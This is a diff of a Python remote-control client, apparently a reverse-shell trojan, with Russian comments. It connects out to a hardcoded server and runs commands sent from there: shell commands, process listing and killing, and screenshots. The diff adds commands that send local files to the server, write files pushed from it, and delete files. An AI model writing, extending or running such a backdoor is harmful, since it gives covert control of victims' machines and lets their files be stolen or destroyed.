@@ -4,7 +4,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # ваш IP сервера
+SERVER_IP = "192.168.100.3"  # замените на IP вашего сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
@@ -31,14 +31,17 @@ def main():
 
         try:
             while True:
-                data = s.recv(BUFFER_SIZE).decode(errors='ignore')
+                data = s.recv(BUFFER_SIZE)
                 if not data:
                     break
-                if data == "exit":
+                command = data.decode(errors='ignore')
+                if not command:
+                    break
+                if command == "exit":
                     break
 
-                if data.startswith("cmd:"):
-                    cmd = data[4:]
+                if command.startswith("cmd:"):
+                    cmd = command[4:]
 
                     if cmd.startswith("cd"):
                         path = cmd[2:].strip()
@@ -52,7 +55,6 @@ def main():
                             s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))
 
                     elif cmd.startswith("ls"):
-                        # Новая обработка: ls список файлов
                         path = cmd[2:].strip()
                         if not path or path == "~":
                             path = os.path.expanduser("~")
@@ -75,15 +77,15 @@ def main():
                         output = execute_command(cmd)
                         s.send(output.encode(errors='ignore'))
 
-                elif data == "process_list":
+                elif command == "process_list":
                     if is_windows():
                         procs = subprocess.getoutput('tasklist')
                     else:
                         procs = subprocess.getoutput('ps aux')
                     s.send(procs.encode(errors='ignore'))
 
-                elif data.startswith("kill:"):
-                    pid = data[5:]
+                elif command.startswith("kill:"):
+                    pid = command[5:]
                     try:
                         if is_windows():
                             subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
@@ -93,7 +95,7 @@ def main():
                     except Exception as e:
                         s.send(f"Ошибка: {e}".encode(errors='ignore'))
 
-                elif data == "screenshot":
+                elif command == "screenshot":
                     try:
                         import pyautogui
                         screenshot = pyautogui.screenshot()
@@ -108,10 +110,44 @@ def main():
                     except Exception as e:
                         s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))
 
+                elif command.startswith("download:"):
+                    filepath = command[len("download:"):].strip()
+                    try:
+                        with open(filepath, "rb") as f:
+                            while True:
+                                chunk = f.read(BUFFER_SIZE)
+                                if not chunk:
+                                    break
+                                s.sendall(chunk)
+                        s.sendall(b"__file_transfer_end__")
+                    except Exception as e:
+                        s.send(f"Ошибка при чтении файла: {e}".encode(errors='ignore'))
+
+                elif command.startswith("upload:"):
+                    filepath = command[len("upload:"):].strip()
+                    try:
+                        with open(filepath, "wb") as f:
+                            while True:
+                                chunk = s.recv(BUFFER_SIZE)
+                                if chunk == b"__file_transfer_end__" or not chunk:
+                                    break
+                                f.write(chunk)
+                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.".encode(errors='ignore'))
+                    except Exception as e:
+                        s.send(f"Ошибка при сохранении файла: {e}".encode(errors='ignore'))
+
+                elif command.startswith("delete:"):
+                    filepath = command[len("delete:"):].strip()
+                    try:
+                        os.remove(filepath)
+                        s.send(f"Файл {os.path.basename(filepath)} удалён.".encode(errors='ignore'))
+                    except Exception as e:
+                        s.send(f"Ошибка удаления файла: {e}".encode(errors='ignore'))
+
                 else:
                     s.send("Неизвестная команда".encode(errors='ignore'))
 
-        except:
+        except Exception:
             pass
         finally:
             s.close()
